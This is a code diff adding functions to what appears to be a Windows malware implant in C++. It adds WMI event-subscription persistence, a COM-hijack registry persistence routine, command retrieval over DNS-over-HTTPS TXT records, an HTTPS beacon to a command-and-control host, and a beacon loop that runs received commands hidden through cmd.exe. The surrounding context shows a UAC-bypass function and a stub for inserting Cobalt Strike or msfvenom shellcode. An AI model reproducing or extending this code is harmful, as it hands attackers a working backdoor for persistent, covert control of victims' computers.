@@ -1316,6 +1316,245 @@ bool uac_cmstplua(const wchar_t* cmd) {
 }
 
 
+bool persist_wmi(const wchar_t* payload_path) {
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+    if (FAILED(hr)) return false;
+
+    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
+                              RPC_C_AUTHN_LEVEL_DEFAULT,
+                              RPC_C_IMP_LEVEL_IMPERSONATE,
+                              nullptr, EOAC_NONE, nullptr);
+
+    IWbemLocator* locator = nullptr;
+    CoCreateInstance(CLSID_WbemLocator, nullptr,
+                     CLSCTX_INPROC_SERVER,
+                     IID_IWbemLocator,
+                     reinterpret_cast<void**>(&locator));
+    if (!locator) { CoUninitialize(); return false; }
+
+    IWbemServices* svc = nullptr;
+    locator->ConnectServer(
+        _bstr_t(L"ROOT\\subscription"), nullptr, nullptr,
+        nullptr, 0, nullptr, nullptr, &svc);
+    locator->Release();
+    if (!svc) { CoUninitialize(); return false; }
+
+    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
+                      nullptr, RPC_C_AUTHN_LEVEL_CALL,
+                      RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
+
+    IWbemClassObject* filter_class = nullptr;
+    svc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr,
+                   &filter_class, nullptr);
+    IWbemClassObject* filter = nullptr;
+    filter_class->SpawnInstance(0, &filter);
+    filter_class->Release();
+
+    VARIANT vt;
+    VariantInit(&vt);
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(L"WQL");
+    filter->Put(L"QueryLanguage", 0, &vt, 0); VariantClear(&vt);
+
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(
+        L"SELECT * FROM __TimerEvent WHERE TimerID='eieu_timer'");
+    filter->Put(L"Query", 0, &vt, 0); VariantClear(&vt);
+
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(L"ROOT\\subscription");
+    filter->Put(L"EventNamespace", 0, &vt, 0); VariantClear(&vt);
+
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(L"eieu_filter");
+    filter->Put(L"Name", 0, &vt, 0); VariantClear(&vt);
+
+    svc->PutInstance(filter, WBEM_FLAG_CREATE_OR_UPDATE,
+                     nullptr, nullptr);
+    filter->Release();
+
+    IWbemClassObject* consumer_class = nullptr;
+    svc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0,
+                   nullptr, &consumer_class, nullptr);
+    IWbemClassObject* consumer = nullptr;
+    consumer_class->SpawnInstance(0, &consumer);
+    consumer_class->Release();
+
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(L"eieu_consumer");
+    consumer->Put(L"Name", 0, &vt, 0); VariantClear(&vt);
+
+    vt.vt     = VT_BSTR;
+    vt.bstrVal= SysAllocString(payload_path);
+    consumer->Put(L"CommandLineTemplate", 0, &vt, 0); VariantClear(&vt);
+
+    svc->PutInstance(consumer, WBEM_FLAG_CREATE_OR_UPDATE,
+                     nullptr, nullptr);
+    consumer->Release();
+    svc->Release();
+    CoUninitialize();
+    return true;
+}
+
+
+// persistence, COM hijack (Overwrite a legitimate COM object by writing to the HKCU CLSID key.)
+bool persist_com_hijack(const CLSID& target_clsid,
+                         const wchar_t* dll_path) {
+    wchar_t clsid_str[64];
+    StringFromGUID2(target_clsid, clsid_str, 64);
+
+    std::wstring key_path = std::wstring(L"Software\\Classes\\CLSID\\")
+                           + clsid_str + L"\\InProcServer32";
+    HKEY key;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, key_path.c_str(),
+                        0, nullptr, REG_OPTION_NON_VOLATILE,
+                        KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS)
+        return false;
+
+    RegSetValueExW(key, nullptr, 0, REG_SZ,
+                   reinterpret_cast<const BYTE*>(dll_path),
+                   static_cast<DWORD>((wcslen(dll_path) + 1) * sizeof(wchar_t)));
+
+    const wchar_t* threading = L"Apartment";
+    RegSetValueExW(key, L"ThreadingModel", 0, REG_SZ,
+                   reinterpret_cast<const BYTE*>(threading),
+                   static_cast<DWORD>((wcslen(threading) + 1) * sizeof(wchar_t)));
+    RegCloseKey(key);
+    return true;
+}
+
+
+std::string doh_query(const std::string& domain) {
+    HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
+                                      nullptr, nullptr, 0);
+    if (!session) return {};
+
+    std::string url = "https://cloudflare-dns.com/dns-query?name="
+                    + domain + "&type=TXT";
+
+    HINTERNET request = InternetOpenUrlA(session, url.c_str(),
+                                         "Accept: application/dns-json\r\n",
+                                         -1L,
+                                         INTERNET_FLAG_SECURE |
+                                         INTERNET_FLAG_NO_CACHE_WRITE,
+                                         0);
+    std::string response;
+    if (request) {
+        char buf[4096]; DWORD read;
+        while (InternetReadFile(request, buf, sizeof(buf), &read) && read)
+            response.append(buf, read);
+        InternetCloseHandle(request);
+    }
+    InternetCloseHandle(session);
+
+    // parse TXT record value from JSON response
+    // format: "data":"<command>" pull value between quotes after "data":"
+    size_t pos = response.find("\"data\":\"");
+    if (pos == std::string::npos) return {};
+    pos += 8;
+    size_t end = response.find('"', pos);
+    return response.substr(pos, end - pos);
+}
+
+
+struct BeaconConfig {
+    std::string c2_host;
+    std::string c2_path; // e.g. "/api/v1/check"
+    uint16_t    port;
+    DWORD       interval_ms;
+};
+
+std::string https_beacon(const BeaconConfig& cfg,
+                          const std::string& machine_id) {
+    HINTERNET session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                                      INTERNET_OPEN_TYPE_PRECONFIG,
+                                      nullptr, nullptr, 0);
+    if (!session) return {};
+
+    HINTERNET conn = InternetConnectA(session, cfg.c2_host.c_str(),
+                                      cfg.port, nullptr, nullptr,
+                                      INTERNET_SERVICE_HTTP, 0, 0);
+    if (!conn) { InternetCloseHandle(session); return {}; }
+
+    const char* accept[] = { "application/json", nullptr };
+    HINTERNET req = HttpOpenRequestA(conn, "POST",
+                                     cfg.c2_path.c_str(),
+                                     nullptr, nullptr, accept,
+                                     INTERNET_FLAG_SECURE |
+                                     INTERNET_FLAG_NO_CACHE_WRITE,
+                                     0);
+    if (!req) {
+        InternetCloseHandle(conn);
+        InternetCloseHandle(session);
+        return {};
+    }
+
+    std::string body = "{\"id\":\"" + machine_id + "\"}";
+    std::string headers = "Content-Type: application/json\r\n";
+
+    HttpSendRequestA(req, headers.c_str(), -1L,
+                     const_cast<char*>(body.c_str()),
+                     static_cast<DWORD>(body.size()));
+
+    std::string resp;
+    char buf[4096]; DWORD read;
+    while (InternetReadFile(req, buf, sizeof(buf), &read) && read)
+        resp.append(buf, read);
+
+    InternetCloseHandle(req);
+    InternetCloseHandle(conn);
+    InternetCloseHandle(session);
+    return resp; // caller parses command from response
+}
+
+
+// machine ID generation
+std::string get_machine_id() {
+    char computer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(computer);
+    GetComputerNameA(computer, &size);
+
+    char user[256]; DWORD usize = sizeof(user);
+    GetUserNameA(user, &usize);
+
+    // combine + hash
+    std::string raw = std::string(computer) + "|" + user;
+    uint32_t h = 5381;
+    for (char c : raw) h = ((h << 5) + h) + static_cast<uint8_t>(c);
+
+    char hex[16];
+    sprintf_s(hex, "%08X", h);
+    return std::string(hex);
+}
+
+
+// beacon loop
+void beacon_loop(const BeaconConfig& cfg,
+                 void* shellcode_base, size_t sc_size,
+                 void* delay_stub,
+                 std::span<const uint8_t> key) {
+    std::string mid = get_machine_id();
+
+    while (true) {
+        // sleep with obfuscation
+        ekko_sleep(shellcode_base, sc_size, cfg.interval_ms, delay_stub, key);
+
+        // check in
+        std::string cmd = https_beacon(cfg, mid);
+        if (cmd.empty()) continue;
+
+        // execute command, shell out to cmd.exe /c <command>
+        // production: parse structured command, run inline
+        std::string exec = "cmd.exe /c " + cmd +
+                           " > %TEMP%\\o.txt 2>&1";
+        WinExec(exec.c_str(), SW_HIDE);
+
+        // read output and exfil on next beacon
+        // (omitted — read %TEMP%\o.txt, POST on next check in)
+    }
+}
+
+
 int main() {
     // разместите здесь полезную нагрузку / шеллкод (msfvenom, Havoc, Cobalt Strike и т. п.)
     uint8_t shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET placeholder
